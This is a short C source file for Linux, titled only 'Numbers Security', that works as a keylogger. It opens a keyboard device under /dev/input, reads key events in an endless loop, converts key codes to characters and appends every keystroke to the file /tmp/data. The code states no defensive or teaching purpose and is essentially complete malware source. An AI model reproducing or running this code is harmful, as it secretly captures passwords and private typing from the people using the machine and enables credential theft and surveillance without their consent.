/* Numbers Security */

#include <stdio.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <fcntl.h>
#include "GetEvent.h"
#include <string.h>
#define LOGFILE "/tmp/data"
#define DEST_SIZE 40


int main(int argc, char **argv){
    char *event = getEvent();
    char *filepath = "/dev/input/";
    char dest[DEST_SIZE] = "";

    strcat(dest, filepath);
    strcat(dest, event);

    char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'\\..zxcvbnm,./";
    struct input_event ev;
    int fd = open(dest, O_RDONLY);
    FILE *fp = fopen(LOGFILE, "a");

    while (1){
        read(fd, &ev, sizeof(ev));
        if ((ev.type == EV_KEY) && (ev.value == 0)){
            fflush(fp);
            switch (ev.code)
            {
            case 28:
                fprintf(fp, "\n");
                break;
            case 57:
                fprintf(fp, " ");
                break;
            
            default:
                fprintf(fp, "%c", map[ev.code]);
                
            }
        }
    }
    fclose(fp);
    close(fd);

}
